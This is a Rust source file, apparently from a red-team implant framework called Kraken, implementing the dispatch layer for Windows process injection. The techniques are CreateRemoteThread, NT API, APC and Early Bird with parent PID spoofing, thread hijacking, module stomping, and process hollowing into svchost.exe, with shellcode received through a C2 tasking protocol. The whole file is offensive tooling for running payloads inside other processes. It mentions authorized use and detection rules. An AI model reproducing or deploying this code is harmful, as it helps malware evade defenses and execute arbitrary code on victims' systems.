//! Process injection module (Phase 7)
//!
//! Supports multiple injection techniques with fallback chain:
//! - Tier 1: Win32 API (VirtualAllocEx + CreateRemoteThread)
//! - Tier 2: NT API (NtAllocateVirtualMemory + NtCreateThreadEx)
//! - Tier 3: APC (NtQueueApcThread)
//! - Tier 3 Variant: Early Bird (APC to suspended process)
//! - Tier 4: Thread Hijack (SetThreadContext)
//! - Tier 4 Variant: Module Stomping (overwrite DLL .text)
//! - Tier 5: Process Hollowing — T1055.012 (classic)
//! - Tier 5 Variant: Transacted Hollowing — T1055.012 via TxF
//!
//! Also provides payload loaders:
//! - Reflective PE loader for in-memory PE execution
//! - CLR loader for .NET assembly execution
//!
//! Detection rules: wiki/detection/yara/kraken_inject.yar

pub mod handle;
pub mod loader;
pub mod pe_loader;
pub mod safety;
pub mod technique;

use common::{InjectOutput, KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::InjectTask;

/// Injection method selection
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionMethod {
    /// Automatically try each tier in sequence until one succeeds
    Auto,
    /// Tier 1: Classic Win32 API (VirtualAllocEx + CreateRemoteThread)
    Win32,
    /// Tier 2: NT API (NtAllocateVirtualMemory + NtCreateThreadEx)
    NtApi,
    /// Tier 3: APC injection (NtQueueApcThread)
    Apc,
    /// Tier 3 Variant: Early Bird APC injection (into suspended process)
    EarlyBird,
    /// Tier 4: Thread hijacking (suspend, modify context, resume)
    ThreadHijack,
    /// Tier 4 Variant: Module stomping (overwrite DLL .text section)
    ModuleStomping,
    /// Tier 5: Classic process hollowing (T1055.012)
    Hollowing,
    /// Tier 5 Variant: Transacted (Phantom) process hollowing via NTFS TxF (T1055.012)
    TransactedHollowing,
}

/// Result of an injection attempt
#[derive(Debug)]
pub struct InjectionResult {
    /// Whether injection succeeded
    pub success: bool,
    /// Thread ID of the created/hijacked thread (if available)
    pub thread_id: Option<u32>,
    /// Name of the technique that was used
    pub technique_used: String,
    /// Error message if injection failed
    pub error: Option<String>,
}

/// Inject shellcode into a target process
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `method` - Which injection technique to use
/// * `wait` - Whether to wait for the injected thread to complete
/// * `timeout_ms` - Timeout in milliseconds (0 = infinite)
///
/// # Safety
/// This function performs process injection which modifies another process's memory.
/// Only use in authorized red team operations.
#[cfg(windows)]
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    method: InjectionMethod,
    wait: bool,
    timeout_ms: u32,
    parent_pid: Option<u32>,
) -> Result<InjectionResult, KrakenError> {
    use safety::{check_architecture, check_denylist};

    // Execute injection based on method
    match method {
        InjectionMethod::Auto => {
            // For Auto with PID 0, use Early Bird (spawns new process)
            if target_pid == 0 {
                return technique::earlybird::inject(
                    "C:\\Windows\\System32\\notepad.exe",
                    shellcode,
                    wait,
                    timeout_ms,
                    parent_pid,
                );
            }
            // Safety checks for existing process injection
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            // Try each tier in sequence
            if let Ok(result) = technique::win32::inject(target_pid, shellcode, wait, timeout_ms) {
                return Ok(result);
            }
            if let Ok(result) = technique::ntapi::inject(target_pid, shellcode, wait, timeout_ms) {
                return Ok(result);
            }
            technique::apc::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::Win32 => {
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            technique::win32::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::NtApi => {
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            technique::ntapi::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::Apc => {
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            technique::apc::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::EarlyBird => {
            // Early Bird spawns its own process; optionally spoof the parent PID
            technique::earlybird::inject(
                "C:\\Windows\\System32\\notepad.exe",
                shellcode,
                wait,
                timeout_ms,
                parent_pid,
            )
        }
        InjectionMethod::ThreadHijack => {
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            technique::hijack::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::ModuleStomping => {
            check_denylist(target_pid)?;
            check_architecture(target_pid)?;
            technique::stomping::inject(target_pid, shellcode, wait, timeout_ms)
        }
        InjectionMethod::Hollowing => {
            // shellcode field carries the PE payload bytes for hollowing techniques.
            // target_pid is ignored; a new process is spawned as the host.
            let target_exe = "C:\\Windows\\System32\\svchost.exe";
            match technique::hollowing::hollow(target_exe, shellcode) {
                Ok(pid) => Ok(InjectionResult {
                    success: true,
                    thread_id: Some(pid),
                    technique_used: "Process Hollowing (T1055.012)".to_string(),
                    error: None,
                }),
                Err(e) => Ok(InjectionResult {
                    success: false,
                    thread_id: None,
                    technique_used: "Process Hollowing (T1055.012)".to_string(),
                    error: Some(e.to_string()),
                }),
            }
        }
        InjectionMethod::TransactedHollowing => {
            // shellcode field carries the PE payload bytes.
            // target_exe uses NT path format for NtCreateFile.
            let target_exe = "\\??\\C:\\Windows\\System32\\svchost.exe";
            match technique::txf_hollowing::txf_hollow(target_exe, shellcode) {
                Ok(pid) => Ok(InjectionResult {
                    success: true,
                    thread_id: Some(pid),
                    technique_used: "Transacted Hollowing / TxF (T1055.012)".to_string(),
                    error: None,
                }),
                Err(e) => Ok(InjectionResult {
                    success: false,
                    thread_id: None,
                    technique_used: "Transacted Hollowing / TxF (T1055.012)".to_string(),
                    error: Some(e.to_string()),
                }),
            }
        }
    }
}

#[cfg(not(windows))]
pub fn inject(
    _target_pid: u32,
    _shellcode: &[u8],
    _method: InjectionMethod,
    _wait: bool,
    _timeout_ms: u32,
    _parent_pid: Option<u32>,
) -> Result<InjectionResult, KrakenError> {
    Err(KrakenError::Module(
        "process injection only supported on Windows".into(),
    ))
}

// ---------------------------------------------------------------------------
// Module trait implementation for runtime loading
// ---------------------------------------------------------------------------

/// Inject module for runtime loading
pub struct InjectModule {
    id: ModuleId,
}

impl InjectModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("inject"),
        }
    }
}

impl Default for InjectModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for InjectModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Inject"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        #[cfg(windows)]
        {
            let task: InjectTask = InjectTask::decode(task_data)
                .map_err(|e| KrakenError::Protocol(e.to_string()))?;
            // Map proto InjectionMethod to mod-inject InjectionMethod
            let method = match task.method() {
                protocol::InjectionMethod::Unspecified |
                protocol::InjectionMethod::Auto => InjectionMethod::Auto,
                protocol::InjectionMethod::Win32 => InjectionMethod::Win32,
                protocol::InjectionMethod::NtApi => InjectionMethod::NtApi,
                protocol::InjectionMethod::Apc => InjectionMethod::Apc,
                protocol::InjectionMethod::ThreadHijack => InjectionMethod::ThreadHijack,
                protocol::InjectionMethod::EarlyBird => InjectionMethod::EarlyBird,
                protocol::InjectionMethod::ModuleStomping => InjectionMethod::ModuleStomping,
            };

            match inject(
                task.target_pid,
                &task.shellcode,
                method,
                task.wait,
                task.timeout_ms,
                task.parent_pid,
            ) {
                Ok(result) => {
                    let response = InjectOutput {
                        success: result.success,
                        thread_id: result.thread_id.unwrap_or(0),
                        technique_used: result.technique_used,
                        error: result.error,
                    };
                    Ok(TaskResult::Inject(response))
                }
                Err(e) => {
                    let response = InjectOutput {
                        success: false,
                        thread_id: 0,
                        technique_used: String::new(),
                        error: Some(e.to_string()),
                    };
                    Ok(TaskResult::Inject(response))
                }
            }
        }

        #[cfg(not(windows))]
        {
            // Validate the task data is parseable even on non-Windows
            let _task: InjectTask = InjectTask::decode(task_data)
                .map_err(|e| KrakenError::Protocol(e.to_string()))?;

            let response = InjectOutput {
                success: false,
                thread_id: 0,
                technique_used: String::new(),
                error: Some("injection only supported on Windows".into()),
            };
            Ok(TaskResult::Inject(response))
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(InjectModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injection_method_debug() {
        assert_eq!(format!("{:?}", InjectionMethod::Auto), "Auto");
        assert_eq!(format!("{:?}", InjectionMethod::Win32), "Win32");
    }

    #[test]
    fn test_injection_result_debug() {
        let result = InjectionResult {
            success: true,
            thread_id: Some(1234),
            technique_used: "Win32".to_string(),
            error: None,
        };
        assert!(result.success);
        assert_eq!(result.thread_id, Some(1234));
    }

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject(1234, &[0x90], InjectionMethod::Auto, false, 0, None);
        assert!(result.is_err());
        if let Err(KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }
}
